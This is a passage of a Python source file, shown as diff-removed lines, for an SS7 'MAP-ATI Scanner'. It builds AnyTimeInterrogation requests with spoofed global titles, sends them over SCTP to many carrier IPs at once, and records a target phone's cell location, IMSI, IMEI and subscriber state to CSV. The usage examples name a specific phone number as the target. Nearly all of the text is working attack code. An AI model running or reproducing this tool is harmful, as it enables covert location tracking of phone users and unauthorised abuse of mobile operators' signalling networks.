-        print_colored(f"🔢 Error Code: {result.error_code}", Colors.RED)
-    
-    # Technical Details
-    if result.map_version != "N/A":
-        print_colored(f"🗺️  MAP Version: {result.map_version}", Colors.DIM)
-    
-    if result.used_cgpa_gt:
-        print_colored(f"🔧 GT: {result.used_cgpa_gt[-8:]}..., SSN: {result.used_cgpa_ssn}, PC: {result.used_sccp_pc}", Colors.DIM)
-
-def update_professional_statistics(result: ScanResult):
-    """Update professional statistics with comprehensive metrics"""
-    with stats_lock:
-        PROFESSIONAL_STATS['total_attempts'] += 1
-        
-        if result.success:
-            PROFESSIONAL_STATS['successful_responses'] += 1
-        
-        # Location statistics
-        if result.location_info.cgi_found or result.location_info.lai_found:
-            PROFESSIONAL_STATS['location_extractions'] += 1
-        
-        # Subscriber statistics
-        if result.subscriber_info.imsi != "N/A":
-            PROFESSIONAL_STATS['imsi_extractions'] += 1
-        
-        if result.subscriber_info.imei != "N/A":
-            PROFESSIONAL_STATS['imei_extractions'] += 1
-        
-        if result.subscriber_info.subscriber_state != "N/A":
-            PROFESSIONAL_STATS['subscriber_state_extractions'] += 1
-        
-        # Network information
-        if (result.location_info.vlr_name != "N/A" or 
-            result.location_info.msc_name != "N/A" or 
-            result.location_info.sgsn_name != "N/A"):
-            PROFESSIONAL_STATS['network_info_extractions'] += 1
-        
-        # Full information extraction
-        if (result.location_info.cgi_found and 
-            result.subscriber_info.imsi != "N/A"):
-            PROFESSIONAL_STATS['full_info_extractions'] += 1
-        
-        # Error tracking
-        if 'Timeout' in result.tcap_outcome:
-            PROFESSIONAL_STATS['timeouts'] += 1
-        elif 'Error' in result.tcap_outcome:
-            PROFESSIONAL_STATS['map_errors'] += 1
-        elif 'Reject' in result.tcap_outcome:
-            PROFESSIONAL_STATS['tcap_rejects'] += 1
-        elif 'ConnectionRefused' in result.tcap_outcome or 'NetworkError' in result.tcap_outcome:
-            PROFESSIONAL_STATS['connection_errors'] += 1
-        
-        # Track error breakdown
-        PROFESSIONAL_STATS['error_breakdown'][result.tcap_outcome] += 1
-        
-        # Calculate success rate
-        if PROFESSIONAL_STATS['total_attempts'] > 0:
-            PROFESSIONAL_STATS['success_rate'] = (PROFESSIONAL_STATS['successful_responses'] / 
-                                                 PROFESSIONAL_STATS['total_attempts']) * 100
-        
-        # Calculate data richness score
-        data_points = 0
-        if result.location_info.cgi_found:
-            data_points += 4  # MCC, MNC, LAC, CI
-        if result.subscriber_info.imsi != "N/A":
-            data_points += 3
-        if result.subscriber_info.imei != "N/A":
-            data_points += 2
-        if result.location_info.vlr_name != "N/A":
-            data_points += 1
-        
-        PROFESSIONAL_STATS['data_richness_score'] = data_points
-
-# === Professional PDU Builder ===
-
-def format_msisdn_professional(msisdn: str, nai_byte: int = 0x91) -> bytes:
-    """Professional MSISDN formatting with enhanced validation"""
-    if not msisdn:
-        raise ValueError("MSISDN cannot be empty")
-    
-    digits = re.sub(r'[^\d]', '', msisdn)
-    if not digits:
-        raise ValueError("MSISDN must contain digits")
-    
-    if len(digits) < 7 or len(digits) > 15:
-        if logger:
-            logger.warning(f"MSISDN length unusual: {len(digits)} digits")
-    
-    # Enhanced BCD encoding
-    if len(digits) % 2:
-        digits += "F"
-    
-    bcd_bytes = bytearray([nai_byte])
-    
-    for i in range(0, len(digits), 2):
-        digit1 = int(digits[i])
-        digit2 = int(digits[i+1]) if digits[i+1] != 'F' else 0xF
-        bcd_bytes.append((digit2 << 4) | digit1)
-    
-    return bytes(bcd_bytes)
-
-def build_sccp_address_professional(ssn: int, gt: str, tt: int = 0, np: int = 1, 
-                                   nai: int = 4, es: int = 1) -> Any:
-    """Professional SCCP address builder"""
-    try:
-        addr = PYCRATE['SCCP']._SCCPAddr()
-        
-        # Enhanced address indicator setup
-        addr['AddrInd']['res'].set_val(0)
-        addr['AddrInd']['RoutingInd'].set_val(1)
-        addr['AddrInd']['GTInd'].set_val(4)
-        addr['AddrInd']['SSNInd'].set_val(1)
-        addr['AddrInd']['PCInd'].set_val(0)
-        
-        addr['SSN'].set_val(ssn)
-        
-        # Professional GT_4 structure
-        gt4 = addr['GT'].get_alt()
-        gt4['TranslationType'].set_val(tt)
-        gt4['NumberingPlan'].set_val(np)
-        gt4['EncodingScheme'].set_val(es)
-        gt4['spare'].set_val(0)
-        gt4['NAI'].set_val(nai)
-        
-        gt4.set_addr_bcd(gt)
-        
-        return addr
-        
-    except Exception as e:
-        if logger:
-            logger.error(f"Professional SCCP address build error: {e}")
-        raise
-
-def build_ati_pdu_professional(otid_bytes: bytes, ati_variant: AtiVariant, target_msisdn: str,
-                              cgpa_gt: str, args: argparse.Namespace, unique_id: str) -> Optional[bytes]:
-    """Professional ATI PDU builder with full Pycrate integration"""
-    
-    try:
-        if logger:
-            logger.debug(f"[{unique_id}] Building professional ATI PDU: {ati_variant.value}")
-        
-        # Build enhanced MAP ATI Arguments
-        ati_args = {}
-        
-        # Professional subscriber identity encoding
-        try:
-            nai_val = (0x80 | args.cdpa_nai) if args.cdpa_nai <= 15 else args.cdpa_nai
-            msisdn_bytes = format_msisdn_professional(target_msisdn, nai_val)
-            ati_args['subscriberIdentity'] = ('msisdn', msisdn_bytes)
-            if logger:
-                logger.debug(f"[{unique_id}] Professional MSISDN encoded: {len(msisdn_bytes)} bytes")
-        except Exception as e:
-            if logger:
-                logger.error(f"[{unique_id}] Professional MSISDN encoding error: {e}")
-            return None
-        
-        # Enhanced requested info based on variant
-        if ati_variant != AtiVariant.MINIMAL:
-            req_info = {}
-            
-            if ati_variant in [AtiVariant.STANDARD, AtiVariant.LOCATION_ONLY, AtiVariant.ALL_INFO]:
-                req_info['locationInformation'] = 0
-                req_info['currentLocationRetrieved'] = 0
-                
-            if ati_variant in [AtiVariant.STANDARD, AtiVariant.SUBSCRIBER_STATE, AtiVariant.ALL_INFO]:
-                req_info['subscriberInfo'] = 0
-                
-            if ati_variant in [AtiVariant.EQUIPMENT_STATUS, AtiVariant.ALL_INFO]:
-                req_info['equipmentStatus'] = 0
-                req_info['imei'] = 0
-                
-            if ati_variant == AtiVariant.ALL_INFO:
-                req_info['locationInformationEPS'] = 0
-                req_info['userCSGInformation'] = 0
-                
-            if req_info:
-                ati_args['requestedInfo'] = req_info
-                if logger:
-                    logger.debug(f"[{unique_id}] Professional requested info: {list(req_info.keys())}")
-        
-        # Professional GSM-SCF Address
-        if ati_variant != AtiVariant.MINIMAL and cgpa_gt:
-            try:
-                nai_scf = (0x80 | args.cgpa_nai) if args.cgpa_nai <= 15 else args.cgpa_nai
-                scf_bytes = format_msisdn_professional(cgpa_gt, nai_scf)
-                ati_args['gsmSCF-Address'] = scf_bytes
-                if logger:
-                    logger.debug(f"[{unique_id}] Professional GSM-SCF address encoded: {len(scf_bytes)} bytes")
-            except Exception as e:
-                if logger:
-                    logger.warning(f"[{unique_id}] Professional GSM-SCF encoding error: {e}")
-        
-        # Get professional MAP ATI Argument Type
-        MAP_MS_DataTypes = getattr(PYCRATE['MAP_defs'], 'MAP_MS_DataTypes', PYCRATE['MAP_defs'])
-        AtiArgType = getattr(MAP_MS_DataTypes, 'AnyTimeInterrogationArg', None)
-        
-        if not AtiArgType:
-            if logger:
-                logger.error(f"[{unique_id}] AnyTimeInterrogationArg type not found")
-            return None
-        
-        # Professional MAP parameter encoding
-        try:
-            ati_param = deepcopy(AtiArgType)
-            ati_param.set_val(ati_args)
-            parameter_ber = ati_param.to_ber()
-            if logger:
-                logger.debug(f"[{unique_id}] Professional MAP parameter encoded: {len(parameter_ber)} bytes")
-        except Exception as e:
-            if logger:
-                logger.error(f"[{unique_id}] Professional MAP parameter encoding error: {e}")
-            return None
-        
-        # Build professional TCAP Invoke
-        invoke_id = random.randint(1, 127)
-        
-        try:
-            invoke_pdu = deepcopy(PYCRATE['TCAP_defs'].Invoke)
-            invoke_values = {
-                'invokeID': invoke_id,
-                'opCode': ('localValue', MAP_OP_ANY_TIME_INTERROGATION)
-            }
-            invoke_pdu.set_val(invoke_values)
-            
-            # Professional parameter setting
-            try:
-                invoke_pdu._cont['parameter'].from_ber(parameter_ber)
-                if logger:
-                    logger.debug(f"[{unique_id}] Professional invoke parameter set successfully")
-            except Exception:
-                try:
-                    invoke_pdu._cont['parameter']._val = parameter_ber
-                    if logger:
-                        logger.debug(f"[{unique_id}] Professional parameter set via _val")
-                except Exception as param_e2:
-                    if logger:
-                        logger.error(f"[{unique_id}] All professional parameter methods failed: {param_e2}")
-                    return None
-            
-        except Exception as e:
-            if logger:
-                logger.error(f"[{unique_id}] Professional invoke building error: {e}")
-            return None
-        
-        # Build professional Component
-        try:
-            component_obj = deepcopy(PYCRATE['TCAP_defs'].Component)
-            component_obj.set_val(('invoke', invoke_pdu.get_val()))
-            
-            cp_obj = deepcopy(PYCRATE['TCAP_defs'].ComponentPortion)
-            cp_obj.set_val([component_obj.get_val()])
-            
-            if logger:
-                logger.debug(f"[{unique_id}] Professional component portion built")
-        except Exception as e:
-            if logger:
-                logger.error(f"[{unique_id}] Professional component building error: {e}")
-            return None
-        
-        # Build professional Begin PDU
-        try:
-            begin_pdu = deepcopy(PYCRATE['TCAP_defs'].Begin)
-            begin_values = {'otid': otid_bytes}
-            
-            if cp_obj.get_val():
-                begin_values['components'] = cp_obj.get_val()
-            
-            begin_pdu.set_val(begin_values)
-            
-            tcap_message = deepcopy(PYCRATE['TCAP_defs'].TCMessage)
-            tcap_message.set_val(('begin', begin_pdu.get_val()))
-            
-            tcap_bytes = tcap_message.to_ber()
-            if logger:
-                logger.info(f"[{unique_id}] Professional TCAP PDU built: {len(tcap_bytes)} bytes")
-            
-        except Exception as e:
-            if logger:
-                logger.error(f"[{unique_id}] Professional TCAP message building error: {e}")
-            return None
-        
-        # Build professional SCCP wrapper
-        try:
-            cdpa_addr = build_sccp_address_professional(
-                args.cdpa_ssn, target_msisdn, args.cdpa_tt,
-                args.cdpa_np, args.cdpa_nai, args.cdpa_es
-            )
-            
-            cgpa_addr = build_sccp_address_professional(
-                args.used_cgpa_ssn, cgpa_gt, args.cgpa_tt,
-                args.cgpa_np, args.cgpa_nai, args.cgpa_es
-            )
-            
-            sccp_udt = PYCRATE['SCCP'].SCCPUnitData()
-            sccp_values = {
-                'Type': 9,
-                'ProtocolClass': {
-                    'Handling': 0,
-                    'Class': args.used_sccp_pc & 0x0F
-                },
-                'Pointers': {'Ptr0': 0, 'Ptr1': 0, 'Ptr2': 0},
-                'CalledPartyAddr': {'Len': 0, 'Value': cdpa_addr.get_val()},
-                'CallingPartyAddr': {'Len': 0, 'Value': cgpa_addr.get_val()},
-                'Data': {'Len': len(tcap_bytes), 'Value': tcap_bytes}
-            }
-            sccp_udt.set_val(sccp_values)
-            
-            sccp_bytes = sccp_udt.to_bytes()
-            if logger:
-                logger.info(f"[{unique_id}] Professional complete PDU built: {len(sccp_bytes)} bytes")
-            
-            return sccp_bytes
-            
-        except Exception as e:
-            if logger:
-                logger.error(f"[{unique_id}] Professional SCCP building error: {e}")
-            return None
-        
-    except Exception as e:
-        if logger:
-            logger.error(f"[{unique_id}] Professional PDU build exception: {e}", exc_info=True)
-        return None
-
-# === Professional Scanner Function ===
-
-def process_target_professional(ip: str, port: int, args: argparse.Namespace,
-                               otid: bytes, variant: AtiVariant, attempt: int = 1) -> ScanResult:
-    """Professional target processing with comprehensive error handling"""
-    
-    unique_id = f"{ip}:{port}-{otid.hex()[:6]}-{variant.value[:3]}-A{attempt}"
-    start_time = time.perf_counter()
-    
-    if logger:
-        logger.debug(f"[{unique_id}] Starting professional scan")
-    
-    # Generate professional dynamic parameters
-    used_cgpa_ssn = random.choice(args.cgpa_ssn_pool)
-    used_cgpa_gt = gt_pool.get_next_gt() if gt_pool else "212600000000"
-    used_sccp_pc = random.choice(args.sccp_proto_class_pool)
-    
-    args.used_cgpa_ssn = used_cgpa_ssn
-    args.used_cgpa_gt = used_cgpa_gt
-    args.used_sccp_pc = used_sccp_pc
-    
-    # Initialize professional result
-    result = ScanResult(
-        ip=ip,
-        port=port,
-        timestamp=datetime.now(timezone.utc).isoformat(),
-        sent_otid=otid.hex(),
-        ati_variant_used=variant.value,
-        attempt_number=attempt,
-        used_cgpa_ssn=used_cgpa_ssn,
-        used_cgpa_gt=used_cgpa_gt,
-        used_sccp_pc=used_sccp_pc
-    )
-    
-    sock = None
-    
-    try:
-        # Build professional PDU
-        if logger:
-            logger.info(f"[{unique_id}] Building professional {variant.value} PDU")
-        result.tcap_outcome = "Building"
-        
-        sccp_pdu = build_ati_pdu_professional(
-            otid, variant, args.target_msisdn, used_cgpa_gt, args, unique_id
-        )
-        
-        if not sccp_pdu:
-            result.tcap_outcome = "BuildError"
-            result.error_info = "Professional PDU construction failed"
-            return result
-        
-        result.tcap_outcome = "PDU_Built"
-        
-        # Professional network communication
-        if logger:
-            logger.info(f"[{unique_id}] Professional connecting to {ip}:{port}")
-        
-        sock = DEPS['sctp'].sctpsocket_tcp(socket.AF_INET)
-        sock.settimeout(args.sctp_timeout)
-        sock.connect((ip, port))
-        
-        if logger:
-            logger.debug(f"[{unique_id}] Professional connection established")
-        
-        # Send professional PDU
-        bytes_sent = sock.sctp_send(sccp_pdu, ppid=socket.htonl(args.sctp_ppid))
-        if logger:
-            logger.debug(f"[{unique_id}] Professional sent {bytes_sent} bytes")
-        
-        # Receive professional response
-        raw_response = sock.recv(16384)  # Increased buffer for professional use
-        
-        if not raw_response:
-            result.tcap_outcome = "EmptyResponse"
-            result.error_info = "Received empty response"
-            return result
-        
-        if logger:
-            logger.info(f"[{unique_id}] Professional received {len(raw_response)} bytes")
-        
-        # Professional response parsing
-        parse_result = parse_response_professional(raw_response, unique_id)
-        
-        # Update result with professional parse results
-        result.success = parse_result.success
-        result.tcap_outcome = parse_result.tcap_outcome
-        result.error_info = parse_result.error_info
-        result.error_code = parse_result.error_code
-        result.location_info = parse_result.location_info
-        result.subscriber_info = parse_result.subscriber_info
-        result.received_dtid = parse_result.received_dtid
-        result.raw_response_hex = parse_result.raw_response_hex
-        result.map_version = parse_result.map_version
-        result.parsed_data_size = parse_result.parsed_data_size
-        
-        # Professional hex dump logging
-        if DEPS['hexdump'] and logger and logger.isEnabledFor(logging.DEBUG):
-            try:
-                logger.debug(f"[{unique_id}] Professional response hex dump:\n{DEPS['hexdump'].hexdump(raw_response, result='return')}")
-            except Exception:
-                pass
-        
-    except socket.timeout:
-        result.tcap_outcome = "Timeout"
-        result.error_info = f"Professional timeout after {args.sctp_timeout}s"
-        if logger:
-            logger.debug(f"[{unique_id}] Professional timeout")
-        
-    except (ConnectionRefusedError, ConnectionResetError) as conn_e:
-        result.tcap_outcome = "ConnectionRefused"
-        result.error_info = f"Professional connection error: {str(conn_e)[:50]}"
-        
-    except OSError as os_e:
-        result.tcap_outcome = "NetworkError"
-        result.error_info = f"Professional network error: {str(os_e)[:50]}"
-        
-    except Exception as e:
-        result.tcap_outcome = "UnexpectedError"
-        result.error_info = f"Professional unexpected error: {str(e)[:100]}"
-        if logger:
-            logger.exception(f"[{unique_id}] Professional unexpected error")
-        
-    finally:
-        if sock:
-            try:
-                sock.close()
-            except:
-                pass
-        
-        result.duration_ms = (time.perf_counter() - start_time) * 1000
-    
-    # Display professional result
-    display_professional_result(result, unique_id)
-    
-    # Update professional statistics
-    update_professional_statistics(result)
-    
-    return result
-
-# === Professional CSV and Statistics ===
-
-def save_professional_result_to_csv(result: ScanResult, csv_file: Path, headers: List[str]):
-    """Save professional scan result to CSV file"""
-    try:
-        with main_csv_lock:
-            with open(csv_file, 'a', newline='', encoding='utf-8') as f:
-                row_data = []
-                for header in headers:
-                    if header in ['mcc', 'mnc', 'lac', 'cell_id', 'cgi_found', 'lai_found', 
-                                 'vlr_name', 'msc_name', 'sgsn_name', 'geographical_info',
-                                 'location_number', 'location_age', 'rac', 'service_area_code',
-                                 'gmlc_name', 'current_location_retrieved', 'ps_subscriber_state']:
-                        value = str(getattr(result.location_info, header, "")).replace(",", " ").replace("\n", " ")
-                    elif header in ['imsi', 'msisdn', 'imei', 'subscriber_state', 'equipment_status',
-                                   'camel_subscription_info', 'call_forwarding_data', 'call_barring_info',
-                                   'odb_info', 'roaming_restriction', 'subscriber_status']:
-                        value = str(getattr(result.subscriber_info, header, "")).replace(",", " ").replace("\n", " ")
-                    else:
-                        value = str(getattr(result, header, "")).replace(",", " ").replace("\n", " ")
-                    row_data.append(value)
-                f.write(",".join(row_data) + "\n")
-    except Exception as e:
-        if logger:
-            logger.error(f"Professional CSV save error: {e}")
-
-def display_professional_final_statistics():
-    """Display comprehensive professional final statistics"""
-    print_colored("\n" + "="*90, Colors.BRIGHT_CYAN, bold=True)
-    print_colored("📊 PROFESSIONAL SCAN COMPLETE - COMPREHENSIVE STATISTICS", Colors.BRIGHT_GREEN, bold=True)
-    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)
-    
-    # Main professional statistics
-    print_colored(f"📈 Total attempts: {PROFESSIONAL_STATS['total_attempts']}", Colors.WHITE, bold=True)
-    print_colored(f"✅ Successful responses: {PROFESSIONAL_STATS['successful_responses']}", Colors.GREEN)
-    print_colored(f"🎯 Full information extractions: {PROFESSIONAL_STATS['full_info_extractions']}", Colors.BRIGHT_GREEN, bold=True)
-    print_colored(f"📍 Location extractions: {PROFESSIONAL_STATS['location_extractions']}", Colors.BLUE)
-    print_colored(f"📱 IMSI extractions: {PROFESSIONAL_STATS['imsi_extractions']}", Colors.CYAN, bold=True)
-    print_colored(f"📟 IMEI extractions: {PROFESSIONAL_STATS['imei_extractions']}", Colors.CYAN)
-    print_colored(f"📊 Subscriber state extractions: {PROFESSIONAL_STATS['subscriber_state_extractions']}", Colors.MAGENTA)
-    print_colored(f"🏢 Network info extractions: {PROFESSIONAL_STATS['network_info_extractions']}", Colors.BLUE)
-    
-    # Professional error statistics
-    print_colored(f"⏰ Timeouts: {PROFESSIONAL_STATS['timeouts']}", Colors.YELLOW)
-    print_colored(f"❌ MAP errors: {PROFESSIONAL_STATS['map_errors']}", Colors.RED)
-    print_colored(f"🚫 TCAP rejects: {PROFESSIONAL_STATS['tcap_rejects']}", Colors.RED)
-    print_colored(f"🔌 Connection errors: {PROFESSIONAL_STATS['connection_errors']}", Colors.RED)
-    
-    # Professional success rates
-    if PROFESSIONAL_STATS['total_attempts'] > 0:
-        success_rate = PROFESSIONAL_STATS['success_rate']
-        full_info_rate = (PROFESSIONAL_STATS['full_info_extractions'] / PROFESSIONAL_STATS['total_attempts']) * 100
-        print_colored(f"📊 Professional success rate: {success_rate:.2f}%", Colors.GREEN, bold=True)
-        print_colored(f"📊 Full information rate: {full_info_rate:.2f}%", Colors.BRIGHT_GREEN, bold=True)
-        print_colored(f"📊 Data richness score: {PROFESSIONAL_STATS['data_richness_score']:.1f}/10", Colors.CYAN, bold=True)
-    
-    # Professional time statistics
-    if PROFESSIONAL_STATS['start_time']:
-        total_time = time.time() - PROFESSIONAL_STATS['start_time']
-        print_colored(f"⏱️  Total professional scan time: {total_time:.2f} seconds", Colors.CYAN)
-        if PROFESSIONAL_STATS['total_attempts'] > 0:
-            avg_time = total_time / PROFESSIONAL_STATS['total_attempts']
-            print_colored(f"⏱️  Average per target: {avg_time:.2f} seconds", Colors.CYAN)
-    
-    # Professional error breakdown
-    if PROFESSIONAL_STATS['error_breakdown']:
-        print_colored("\n🔍 Professional Error Breakdown:", Colors.YELLOW, bold=True)
-        for error_type, count in sorted(PROFESSIONAL_STATS['error_breakdown'].items(), key=lambda x: x[1], reverse=True):
-            if count > 0:
-                print_colored(f"   {error_type}: {count}", Colors.YELLOW)
-    
-    print_colored("="*90, Colors.BRIGHT_CYAN, bold=True)
-
-# === Professional Main Function ===
-
-def main():
-    """Professional main function with comprehensive argument parsing"""
-    global logger, PROFESSIONAL_STATS, gt_pool
-    
-    # Print professional banner
-    print_professional_banner()
-    
-    # Professional argument parser
-    parser = argparse.ArgumentParser(
-        description="Professional MAP-ATI Scanner v4.0 - Full Pycrate Integration",
-        formatter_class=argparse.RawTextHelpFormatter,
-        epilog="""
-Professional Examples:
-  python3 enhanced_map_ati_scanner_v4.py ips.txt --target-msisdn 212681364829
-  python3 enhanced_map_ati_scanner_v4.py ips.txt --target-msisdn 212681364829 --threads 50 --ati-variant ALL_INFO
-  python3 enhanced_map_ati_scanner_v4.py ips.txt --target-msisdn 212681364829 --professional-mode --enhanced-parsing
-        """
-    )
-    
-    # Basic professional arguments
-    parser.add_argument("ips_file", nargs='?', default=PROFESSIONAL_CONFIG['ips_file'],
-                       help=f"Professional IPs file (default: {PROFESSIONAL_CONFIG['ips_file']})")
-    parser.add_argument("--target-msisdn", default=PROFESSIONAL_CONFIG['target_msisdn'],
-                       help=f"Target MSISDN (default: {PROFESSIONAL_CONFIG['target_msisdn']})")
-    parser.add_argument("--sctp-ports", default=None,
-                       help="Professional SCTP ports (comma-separated)")
-    parser.add_argument("--sctp-timeout", type=int, default=PROFESSIONAL_CONFIG['sctp_timeout'],
-                       help=f"Professional SCTP timeout (default: {PROFESSIONAL_CONFIG['sctp_timeout']})")
-    parser.add_argument("--sctp-ppid", type=lambda x: int(x, 0), default=PROFESSIONAL_CONFIG['sctp_ppid'],
-                       help=f"Professional SCTP PPID (default: {PROFESSIONAL_CONFIG['sctp_ppid']})")
-    parser.add_argument("--threads", type=int, default=PROFESSIONAL_CONFIG['max_workers'],
-                       help=f"Professional worker threads (default: {PROFESSIONAL_CONFIG['max_workers']})")
-    parser.add_argument("--results-dir", default=PROFESSIONAL_CONFIG['results_dir'],
-                       help=f"Professional results directory (default: {PROFESSIONAL_CONFIG['results_dir']})")
-    parser.add_argument("--ati-variant", type=AtiVariant, choices=list(AtiVariant),
-                       default=AtiVariant.STANDARD, help="Professional ATI variant")
-    parser.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR"],
-                       help="Professional logging level")
-    parser.add_argument("--no-csv", action='store_true', help="Disable CSV output")
-    parser.add_argument("--gt-pool-size", type=int, default=PROFESSIONAL_CONFIG['gt_pool_size'],
-                       help=f"Professional GT pool size (default: {PROFESSIONAL_CONFIG['gt_pool_size']})")
-    
-    # Professional SCCP parameters
-    sccp_group = parser.add_argument_group("Professional SCCP Parameters")
-    sccp_group.add_argument("--cdpa-ssn", type=int, default=SCCP_PROFESSIONAL['cdpa_ssn'],
-                           help=f"Called Party SSN (default: {SCCP_PROFESSIONAL['cdpa_ssn']})")
-    sccp_group.add_argument("--cdpa-tt", type=int, default=SCCP_PROFESSIONAL['cdpa_tt'],
-                           help=f"Called Party TT (default: {SCCP_PROFESSIONAL['cdpa_tt']})")
-    sccp_group.add_argument("--cdpa-np", type=int, default=SCCP_PROFESSIONAL['cdpa_np'],
-                           help=f"Called Party NP (default: {SCCP_PROFESSIONAL['cdpa_np']})")
-    sccp_group.add_argument("--cdpa-nai", type=int, default=SCCP_PROFESSIONAL['cdpa_nai'],
-                           help=f"Called Party NAI (default: {SCCP_PROFESSIONAL['cdpa_nai']})")
-    sccp_group.add_argument("--cdpa-es", type=int, default=SCCP_PROFESSIONAL['cdpa_es'],
-                           help=f"Called Party ES (default: {SCCP_PROFESSIONAL['cdpa_es']})")
-    sccp_group.add_argument("--cgpa-ssn-pool", type=str, default=None,
-                           help="Professional Calling Party SSN pool")
-    sccp_group.add_argument("--cgpa-gt-digits", default=SCCP_PROFESSIONAL['cgpa_gt_digits'],
-                           help=f"Professional base GT digits (default: {SCCP_PROFESSIONAL['cgpa_gt_digits']})")
-    sccp_group.add_argument("--cgpa-tt", type=int, default=SCCP_PROFESSIONAL['cgpa_tt'],
-                           help=f"Calling Party TT (default: {SCCP_PROFESSIONAL['cgpa_tt']})")
-    sccp_group.add_argument("--cgpa-np", type=int, default=SCCP_PROFESSIONAL['cgpa_np'],
-                           help=f"Calling Party NP (default: {SCCP_PROFESSIONAL['cgpa_np']})")
-    sccp_group.add_argument("--cgpa-nai", type=int, default=SCCP_PROFESSIONAL['cgpa_nai'],
-                           help=f"Calling Party NAI (default: {SCCP_PROFESSIONAL['cgpa_nai']})")
-    sccp_group.add_argument("--cgpa-es", type=int, default=SCCP_PROFESSIONAL['cgpa_es'],
-                           help=f"Calling Party ES (default: {SCCP_PROFESSIONAL['cgpa_es']})")
-    sccp_group.add_argument("--sccp-proto-class-pool", type=str, default=None,
-                           help="Professional SCCP Protocol Class pool")
-    
-    args = parser.parse_args()
-    
-    # Setup professional logging
-    results_dir = Path(args.results_dir)
-    results_dir.mkdir(parents=True, exist_ok=True)
-    log_file = results_dir / "professional_scanner_v4.log"
-    
-    logger = setup_professional_logging(log_file, args.log_level)
-    logger.info(f"Professional Scanner v4.0 started. Log: {log_file}")
-    
-    # Parse professional parameters
-    if args.cgpa_ssn_pool:
-        try:
-            args.cgpa_ssn_pool = [int(x.strip()) for x in args.cgpa_ssn_pool.split(',') if x.strip()]
-        except ValueError:
-            args.cgpa_ssn_pool = SCCP_PROFESSIONAL['cgpa_ssn_pool']
-    else:
-        args.cgpa_ssn_pool = SCCP_PROFESSIONAL['cgpa_ssn_pool']
-    
-    if args.sccp_proto_class_pool:
-        try:
-            args.sccp_proto_class_pool = [int(x.strip()) for x in args.sccp_proto_class_pool.split(',') if x.strip()]
-        except ValueError:
-            args.sccp_proto_class_pool = SCCP_PROFESSIONAL['sccp_proto_class_pool']
-    else:
-        args.sccp_proto_class_pool = SCCP_PROFESSIONAL['sccp_proto_class_pool']
-    
-    # Parse professional ports
-    if args.sctp_ports:
-        ports = set()
-        try:
-            for part in args.sctp_ports.split(','):
-                part = part.strip()
-                if '-' in part:
-                    start, end = map(int, part.split('-', 1))
-                    ports.update(range(start, end + 1))
-                else:
-                    ports.add(int(part))
-        except ValueError:
-            ports = set(PROFESSIONAL_CONFIG['sctp_ports'])
-        target_ports = sorted(list(ports))
-    else:
-        target_ports = PROFESSIONAL_CONFIG['sctp_ports']
-    
-    # Load professional IPs
-    ip_file = Path(args.ips_file)
-    if not ip_file.exists():
-        print_colored(f"❌ Professional IPs file not found: {ip_file}", Colors.RED, bold=True)
-        sys.exit(1)
-    
-    try:
-        with open(ip_file, 'r', encoding='utf-8') as f:
-            ips = [line.strip().split('#')[0].strip() for line in f 
-                  if line.strip() and not line.strip().startswith('#')]
-    except Exception as e:
-        print_colored(f"❌ Professional error reading IPs file: {e}", Colors.RED, bold=True)
-        sys.exit(1)
-    
-    if not ips:
-        print_colored("❌ No valid IPs found in professional file", Colors.RED, bold=True)
-        sys.exit(1)
-    
-    # Initialize professional GT Pool
-    gt_pool = ProfessionalGTPool(args.cgpa_gt_digits, args.gt_pool_size)
-    
-    # Display professional configuration
-    print_colored(f"\n📞 Professional Target MSISDN: {args.target_msisdn}", Colors.YELLOW, bold=True)
-    print_colored(f"🧵 Professional Threads: {args.threads}", Colors.CYAN)
-    print_colored(f"🔄 Professional ATI Variant: {args.ati_variant.value}", Colors.MAGENTA)
-    print_colored(f"🌐 Professional Scope: {len(ips)} IPs, {len(target_ports)} ports", Colors.BLUE)
-    print_colored(f"📊 Professional Total targets: {len(ips) * len(target_ports)}", Colors.BRIGHT_BLUE, bold=True)
-    print_colored(f"⏰ Professional SCTP Timeout: {args.sctp_timeout}s", Colors.YELLOW)
-    print_colored(f"📂 Professional Results Directory: {results_dir}", Colors.GREEN)
-    
-    # Initialize professional stats
-    PROFESSIONAL_STATS['start_time'] = time.time()
-    
-    # Create professional tasks
-    tasks = []
-    for ip in ips:
-        for port in target_ports:
-            tasks.append({
-                'ip': ip,
-                'port': port,
-                'otid': os.urandom(4),
-                'variant': args.ati_variant,
-                'attempt': 1
-            })
-    
-    logger.info(f"Professional scan starting: {len(ips)} IPs, {len(target_ports)} ports, {len(tasks)} total tasks")
-    
-    # Professional CSV setup
-    csv_headers = [
-        "ip", "port", "timestamp", "sent_otid", "used_cgpa_gt", "used_cgpa_ssn",
-        "used_sccp_pc", "ati_variant_used", "attempt_number", "tcap_outcome",
-        "success", "map_version", "application_context", "mcc", "mnc", "lac", "cell_id", 
-        "cgi_found", "lai_found", "imsi", "msisdn", "imei", "vlr_name", "msc_name", 
-        "sgsn_name", "gmlc_name", "subscriber_state", "equipment_status", 
-        "geographical_info", "location_number", "location_age", "rac", "service_area_code",
-        "camel_subscription_info", "call_forwarding_data", "call_barring_info",
-        "odb_info", "roaming_restriction", "duration_ms", "error_info", "error_code",
-        "received_dtid", "raw_response_hex", "parsed_data_size"
-    ]
-    
-    professional_csv = None
-    if not args.no_csv:
-        professional_csv = results_dir / "professional_scan_results_v4.csv"
-        with open(professional_csv, 'w', newline='', encoding='utf-8') as f:
-            f.write(",".join(csv_headers) + "\n")
-        print_colored(f"📝 Professional CSV Results: {professional_csv}", Colors.GREEN)
-    
-    print_colored("\n🚀 Starting Professional Scan...\n", Colors.BRIGHT_GREEN, bold=True)
-    
-    # Execute professional scan
-    all_results = []
-    processed_count = 0
-    
-    try:
-        with ThreadPoolExecutor(max_workers=args.threads, thread_name_prefix="ProfessionalScanner") as executor:
-            # Submit all professional tasks
-            future_to_task = {}
-            for task_def in tasks:
-                future = executor.submit(
-                    process_target_professional,
-                    task_def['ip'],
-                    task_def['port'],
-                    args,
-                    task_def['otid'],
-                    task_def['variant'],
-                    task_def['attempt']
-                )
-                future_to_task[future] = task_def
-            
-            # Process completed professional tasks
-            for future in as_completed(future_to_task):
-                processed_count += 1
-                task_def = future_to_task[future]
-                
-                try:
-                    result = future.result()
-                    if result:
-                        all_results.append(result)
-                        
-                        # Save to professional CSV
-                        if professional_csv:
-                            save_professional_result_to_csv(result, professional_csv, csv_headers)
-                        
-                        # Professional progress indicator
-                        if processed_count % 25 == 0:
-                            progress = (processed_count / len(tasks)) * 100
-                            print_colored(f"🔄 Professional Progress: {processed_count}/{len(tasks)} ({progress:.1f}%)", 
